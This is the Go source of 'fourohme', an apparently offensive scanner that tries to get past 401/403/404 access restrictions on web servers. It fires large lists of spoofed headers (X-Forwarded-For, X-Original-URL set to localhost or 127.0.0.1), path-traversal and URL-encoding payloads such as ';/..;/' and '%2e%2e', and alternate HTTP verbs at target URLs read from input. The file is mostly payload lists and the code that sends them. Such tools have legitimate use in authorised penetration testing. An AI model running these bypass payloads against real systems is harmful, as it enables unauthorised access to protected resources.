/*
FourOhMe is a tool for finding a bypass for URL's that respond with a 40* HTTP code.
It makes requests to a given URL with different headers and prints the responses.

Three input sources are supported out of the box. Either via STDIN, a file containing URLs or a single URL.

*** It's you ^ 2

Usage:

	fourohme [flags] [path ...]

The flags are:

	-file string
	      Path to a file containing URLs.
	-force
	      Force the scanner to scan all URL's regardless of the initial HTTP status code.
	-silent
	      Don't print shizzle. Only what matters.
	-threads int
	      The amount of threads to be used to execute the HTTP requests. Be gentle or get blocked. (default 4)
	-url string
	      URL to make requests to

When fourohme reads from standard input, it accepts either a single URL
or a list of URLs. It's meant to be used in your command chain.

For example: cat domains.txt | httpx -silent -mc 401,402,403,404,405 | fourohme -silent
*/
package main

import (
	"fmt"
	"net/url"
	"strings"
	"sync"

	"github.com/topscoder/fourohme/libs/fourohme"
)

func main() {
	urlPtr, filePtr, silentPtr, threadsPtr, forcePtr := fourohme.ParseCommandLineFlags()

	if !*silentPtr {
		fourohme.ShowBanner()
	}

	headerKeysList := []string{
		"Base-Url",
		"CF-Conne",
		"Client-IP",
		"Content-Length",
		"Destination",
		"From",
		"Http-Url",
		"Profile",
		"Proxy-Host",
		"Proxy-Url",
		"Proxy",
		"Real-Ip",
		"Redirect",
		"Referer",
		"Referrer",
		"Request-Uri",
		"True-Client-IP",
		"Uri",
		"Url",
		"X-Arbitrary",
		"X-Client-IP",
		"X-Custom-IP-Authorization",
		"X-Forward-For",
		"X-Forwarded-By",
		"X-Forwarded-For-Original",
		"X-Forwarded-For",
		"X-Forwarded-Host",
		"X-Forwarded-Proto",
		"X-Forwarded-Server",
		"X-Forwarded",
		"X-Forwarder-For",
		"X-Hos",
		"X-Host",
		"X-Http-Destinationurl",
		"X-HTTP-DestinationURL",
		"X-Http-Host-Override",
		"X-OReferrer",
		"X-Original-Remote-Addr",
		"X-Original-URL",
		"X-Originally-Forwarded-For",
		"X-Originating-IP",
		"X-Override-URL",
		"X-Proxy-Url",
		"X-ProxyUser-Ip",
		"X-Real-Ip",
		"X-Remote-Addr",
		"X-Remote-IP",
		"X-Rewrite-URL",
		"X-rewrite-url",
		"X-WAP-Profile",
	}

	headerValuesList := []string{
		"127.0.0.1",
		"127.0.0.1:80",
		"127.0.0.1:443",
		"127.0.0.1:8080",
		"localhost",
		"localhost:80",
		"localhost:443",
		"localhost:8080",
		"www.google.com",
		"/",
		"142.250.186.46",
		"0",
	}

	var composedHeadersList []fourohme.Header
	for _, key := range headerKeysList {
		for _, value := range headerValuesList {
			header := fourohme.Header{Key: key, Value: value}
			composedHeadersList = append(composedHeadersList, header)
		}
	}

	httpVerbsList := []string{"GET", "POST", "HEAD", "DELETE", "PUT", "PATCH", "OPTIONS", "TRACE", "TRACK"}

	// Intentionally wrapped with spaces for readability
	urlPayloadsList := []string{
		" ; ",
		" ;/.;. ",
		" ;/.. ",
		" ;/..; ",
		" ;/../ ",
		" ;/../;/ ",
		" ;/../;/../ ",
		" ;/../.;/../ ",
		" ;/../../ ",
		" ;/../..// ",
		" ;/.././../ ",
		" ;/..// ",
		" ;/..//../ ",
		" ;/../// ",
		" ;/..//%2e%2e/ ",
		" ;/..//%2f ",
		" ;/../%2f/ ",
		" ;/..%2f ",
		" ;/..%2f..%2f ",
		" ;/..%2f/ ",
		" ;/..%2f// ",
		" ;/..%2f%2f../ ",
		" ;/.%2e ",
		" ;/.%2e/%2e%2e/%2f ",
		" ;//.. ",
		" ;//../../ ",
		" ;///.. ",
		" ;///../ ",
		" ;///..// ",
		" ;//%2f../ ",
		" ;/%2e. ",
		" ;/%2e%2e ",
		" ;/%2e%2e/ ",
		" ;/%2e%2e%2f/ ",
		" ;/%2e%2e%2f%2f ",
		" ;/%2f/../ ",
		" ;/%2f/..%2f ",
		" ;/%2f%2f../ ",
		" ;%09 ",
		" ;%09; ",
		" ;%09.. ",
		" ;%09..; ",
		" ;%2f;/;/..;/ ",
		" ;%2f;//../ ",
		" ;%2f.. ",
		" ;%2F.. ",
		" ;%2f..;/;// ",
		" ;%2f..;//;/ ",
		" ;%2f..;/// ",
		" ;%2f../;/;/ ",
		" ;%2f../;/;/; ",
		" ;%2f../;// ",
		" ;%2f..//;/ ",
		" ;%2f..//;/; ",
		" ;%2f..//../ ",
		" ;%2f..//..%2f ",
		" ;%2f../// ",
		" ;%2f..///; ",
		" ;%2f../%2f../ ",
		" ;%2f../%2f..%2f ",
		" ;%2f..%2f..%2f%2f ",
		" ;%2f..%2f/ ",
		" ;%2f..%2f/../ ",
		" ;%2f..%2f/..%2f ",
		" ;%2f..%2f%2e%2e%2f%2f ",
		" ;%2f/;/..;/ ",
		" ;%2f/;/../ ",
		" ;%2f//..;/ ",
		" ;%2f//../ ",
		" ;%2f//..%2f ",
		" ;%2f/%2f../ ",
		" ;%2f%2e%2e ",
		" ;%2f%2e%2e%2f%2e%2e%2f%2f ",
		" ;%2f%2f/../ ",
		" ;${path}/ ",
		" ;x ",
		" ;x; ",
		" ;x/ ",
		" ? ",
		" ?? ",
		" ??? ",
		" .. ",
		" ..;/ ",
		" ..;\\ ",
		" ..;\\; ",
		" ..;%00/ ",
		" ..;%0d/ ",
		" ..;%ff/ ",
		" ../ ",
		" .././ ",
		" ../%2f ",
		" ..\\ ",
		" ..\\; ",
		" ..%00;/ ",
		" ..%00/ ",
		" ..%00/; ",
		" ..%09 ",
		" ..%0d ",
		" ..%0d;/ ",
		" ..%0d/ ",
		" ..%0d/; ",
		" ..%2f ",
		" ..%5c ",
		" ..%5c/ ",
		" ..%ff;/ ",
		" ..%ff/ ",
		" ..%ff/; ",
		" ./. ",
		" .//./ ",
		" .%2e/ ",
		" .html ",
		" .json ",
		" / ",
		" /;/ ",
		" /;// ",
		" /;x ",
		" /;x/ ",
		" /. ",
		" /.;/ ",
		" /.;// ",
		" /.. ",
		" /..;/ ",
		" /..;/;/ ",
		" /..;/;/..;/ ",
		" /..;/..;/ ",
		" /..;/../ ",
		" /..;// ",
		" /..;//..;/ ",
		" /..;//../ ",
		" /..;%2f ",
		" /..;%2f..;%2f ",
		" /..;%2f..;%2f..;%2f ",
		" /../ ",
		" /../;/ ",
		" /../;/../ ",
		" /../.;/../ ",
		" /../..;/ ",
		" /../../ ",
		" /../../../ ",
		" /../../..// ",
		" /../..// ",
		" /../..//../ ",
		" /.././../ ",
		" /..// ",
		" /..//..;/ ",
		" /..//../ ",
		" /..//../../ ",
		" /..%2f ",
		" /..%2f..%2f ",
		" /..%2f..%2f..%2f ",
		" /./ ",
		" /.// ",
		" /.randomstring ",
		" /* ",
		" /*/ ",
		" // ",
		" //;/ ",
		" //?anything ",
		" //. ",
		" //.;/ ",
		" //.. ",
		" //..; ",
		" //../../ ",
		" //./ ",
		" ///.. ",
		" ///..; ",
		" ///..;/ ",
		" ///..;// ",
		" ///../ ",
		" ///..// ",
		" //// ",
		" /%20# ",
		" /%20%23 ",
		" /%252e/ ",
		" /%252e%252e%252f/ ",
		" /%252e%252e%253b/ ",
		" /%252e%252f/ ",
		" /%252e%253b/ ",
		" /%252f ",
		" /%2e/ ",
		" /%2e// ",
		" /%2e%2e ",
		" /%2e%2e/ ",
		" /%2e%2e%3b/ ",
		" /%2e%2f/ ",
		" /%2e%3b/ ",
		" /%2e%3b// ",
		" /%2f ",
		" /%2f/ ",
		" /%3b/ ",
		" /x/;/..;/ ",
		" /x/;/../ ",
		" /x/..;/ ",
		" /x/..;/;/ ",
		" /x/..;// ",
		" /x/../ ",
		" /x/../;/ ",
		" /x/..// ",
		" /x//..;/ ",
		" /x//../ ",
		" \\..\\.\\ ",
		" & ",
		" # ",
		" #? ",
		" % ",
		" %09 ",
		" %09; ",
		" %09.. ",
		" %09%3b ",
		" %20 ",
		" %20/ ",
		" %20${path}%20/ ",
		" %23 ",
		" %23%3f ",
		" %252f/ ",
		" %252f%252f ",
		" %26 ",
		" %2e ",
		" %2e%2e ",
		" %2e%2e/ ",
		" %2e%2e%2f ",
		" %2f ",
		" %2f/ ",
		" %2f%20%23 ",
		" %2f%23 ",
		" %2f%2f ",
		" %2f%3b%2f ",
		" %2f%3b%2f%2f ",
		" %2f%3f ",
		" %2f%3f/ ",
		" %3b ",
		" %3b/.. ",
		" %3b//%2f../ ",
		" %3b/%2e. ",
		" %3b/%2e%2e/..%2f%2f ",
		" %3b/%2f%2f../ ",
		" %3b%09 ",
		" %3b%2f.. ",
		" %3b%2f%2e. ",
		" %3b%2f%2e%2e ",
		" %3b%2f%2e%2e%2f%2e%2e%2f%2f ",
		" %3f ",
		" %3f%23 ",
		" %3f%3f ",
		" + ",
		"%2e/${path} ",
	}

	schemeList := []string{
		"http",
		"https",
	}

	// Let's Rock
	urls := fourohme.ReadUrlsFromInput(urlPtr, filePtr)

	for _, pUrl := range urls {
		parsedURL, err := url.Parse(pUrl)
		if err != nil {
			panic(err)
		}

		// Verify if the URL indeed responds with a 40* HTTP code
		if !*forcePtr {
			request := fourohme.Request{Verb: "GET", Url: pUrl, Headers: nil}
			statusCode := fourohme.ExecuteHttpRequest(request)

			if statusCode < 400 || statusCode > 440 {
				fmt.Printf("%s does return %d and therefore doesn't match our criteria. We skip this one.\n", pUrl, statusCode)
				continue
			}
		}

		var wg sync.WaitGroup
		ch := make(chan fourohme.Request, *threadsPtr)

		// Try different schemes
		wg.Add(1)

		for _, scheme := range schemeList {

			schemedUrl := fmt.Sprintf("%s://%s%s", scheme, parsedURL.Host, parsedURL.Path)

			var headerList []fourohme.Header
			request := fourohme.Request{Verb: "GET", Url: schemedUrl, Headers: headerList}

			ch <- request
			go fourohme.TalkHttpBaby(ch, &wg, *silentPtr)
		}

		// Try each header in composedHeadersList
		for _, header := range composedHeadersList {
			wg.Add(1)

			var headerList []fourohme.Header
			headerList = append(headerList, header)

			request := fourohme.Request{Verb: "GET", Url: pUrl, Headers: headerList}

			ch <- request

			go fourohme.TalkHttpBaby(ch, &wg, *silentPtr)
		}

		// Try each header with %URL% variable
		for _, headerKey := range headerKeysList {
			wg.Add(1)

			var headerList []fourohme.Header
			header := fourohme.Header{Key: headerKey, Value: pUrl}
			headerList = append(headerList, header)

			request := fourohme.Request{Verb: "GET", Url: pUrl, Headers: headerList}

			ch <- request

			go fourohme.TalkHttpBaby(ch, &wg, *silentPtr)
		}

		sUrl, sPath := fourohme.GetHostAndPath(parsedURL)

		// Try each header with %PATH% variable
		for _, headerKey := range headerKeysList {
			wg.Add(1)

			var headerList []fourohme.Header
			header := fourohme.Header{Key: headerKey, Value: sPath}
			headerList = append(headerList, header)

			request := fourohme.Request{Verb: "GET", Url: pUrl, Headers: headerList}

			ch <- request

			go fourohme.TalkHttpBaby(ch, &wg, *silentPtr)
		}

		// Try each URL payload in urlPayloadsList
		for _, payload := range urlPayloadsList {
			wg.Add(1)

			loadedUrl := fmt.Sprintf("%s%s%s", sUrl, sPath, strings.TrimSpace(payload))

			var headerList []fourohme.Header
			request := fourohme.Request{Verb: "GET", Url: loadedUrl, Headers: headerList}

			ch <- request

			go fourohme.TalkHttpBaby(ch, &wg, *silentPtr)
		}

		// Try with different HTTP Verbs
		for _, verb := range httpVerbsList {
			wg.Add(1)

			var headerList []fourohme.Header
			request := fourohme.Request{Verb: verb, Url: pUrl, Headers: headerList}

			ch <- request

			go fourohme.TalkHttpBaby(ch, &wg, *silentPtr)
		}

		close(ch)
		wg.Wait()

		fmt.Println("")
	}
}
